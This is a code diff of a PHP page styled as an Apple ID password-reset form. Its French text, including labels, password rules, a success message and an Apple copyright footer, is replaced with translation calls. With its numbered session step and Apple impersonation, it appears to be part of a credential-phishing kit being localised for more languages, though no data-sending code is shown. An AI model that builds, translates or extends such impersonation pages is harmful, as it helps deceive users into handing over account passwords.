@@ -318,13 +318,13 @@ validateSession(4);
             <path d="M12 17V13a7 7 0 0114 0v4" stroke="#0071e3" stroke-width="3" stroke-linecap="round" fill="none"/>
           </svg>
         </div>
-        <h1>Réinitialisez votre mot de passe</h1>
-        <p class="subtitle">Choisissez un nouveau mot de passe pour votre identifiant Apple.</p>
+        <h1><?= t('newpass_title') ?></h1>
+        <p class="subtitle"><?= t('newpass_intro') ?></p>
 
         <div class="field-group">
-          <label>Nouveau mot de passe</label>
+          <label><?= t('newpass_label_new') ?></label>
           <div class="field-wrap">
-            <input type="password" id="newPass" placeholder="Nouveau mot de passe" autocomplete="new-password">
+            <input type="password" id="newPass" placeholder="<?= t('newpass_label_new') ?>" autocomplete="new-password">
             <button class="toggle-vis" type="button" onclick="toggleVis('newPass', this)" tabindex="-1">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
                 <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
@@ -334,15 +334,15 @@ validateSession(4);
         </div>
 
         <div class="rules" id="rules">
-          <div class="rule" id="rule-len"><span class="dot"></span>Au moins 8 caractères</div>
-          <div class="rule" id="rule-upper"><span class="dot"></span>Une lettre majuscule</div>
-          <div class="rule" id="rule-num"><span class="dot"></span>Un chiffre</div>
+          <div class="rule" id="rule-len"><span class="dot"></span><?= t('newpass_rule_len') ?></div>
+          <div class="rule" id="rule-upper"><span class="dot"></span><?= t('newpass_rule_upper') ?></div>
+          <div class="rule" id="rule-num"><span class="dot"></span><?= t('newpass_rule_num') ?></div>
         </div>
 
         <div class="field-group">
-          <label>Confirmer le mot de passe</label>
+          <label><?= t('newpass_label_confirm') ?></label>
           <div class="field-wrap">
-            <input type="password" id="confirmPass" placeholder="Confirmer le mot de passe" autocomplete="new-password">
+            <input type="password" id="confirmPass" placeholder="<?= t('newpass_label_confirm') ?>" autocomplete="new-password">
             <button class="toggle-vis" type="button" onclick="toggleVis('confirmPass', this)" tabindex="-1">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
                 <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
@@ -351,9 +351,9 @@ validateSession(4);
           </div>
         </div>
 
-        <div class="error-msg hidden" id="errMsg">Les mots de passe ne correspondent pas.</div>
+        <div class="error-msg hidden" id="errMsg"><?= t('newpass_error_mismatch') ?></div>
 
-        <button class="btn-submit" id="btnSubmit" disabled>Modifier le mot de passe</button>
+        <button class="btn-submit" id="btnSubmit" disabled><?= t('newpass_btn') ?></button>
       </div>
     </div>
 
@@ -365,8 +365,8 @@ validateSession(4);
             <polyline points="8,20 16,28 30,12" stroke-linecap="round" stroke-linejoin="round"/>
           </svg>
         </div>
-        <p class="success-title">Compte sécurisé</p>
-        <p class="success-body">Votre compte Apple est de nouveau sécurisé. Pour toute nouvelle connexion, votre nouveau mot de passe vous sera demandé.</p>
+        <p class="success-title"><?= t('newpass_heading') ?></p>
+        <p class="success-body"><?= t('newpass_subtitle') ?></p>
       </div>
     </div>
 
@@ -376,11 +376,11 @@ validateSession(4);
 
   <footer class="site-footer">
     <nav class="footer-links">
-      <a href="#">État du système</a>
-      <a href="#">Engagement de confidentialité</a>
-      <a href="#">Conditions générales</a>
+      <a href="#"><?= t('push_footer_status') ?></a>
+      <a href="#"><?= t('push_footer_privacy') ?></a>
+      <a href="#"><?= t('push_footer_terms') ?></a>
     </nav>
-    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Tous droits réservés.</span>
+    <span class="footer-copy"><?= t('push_footer_copyright') ?></span>
   </footer>
 
 <script>
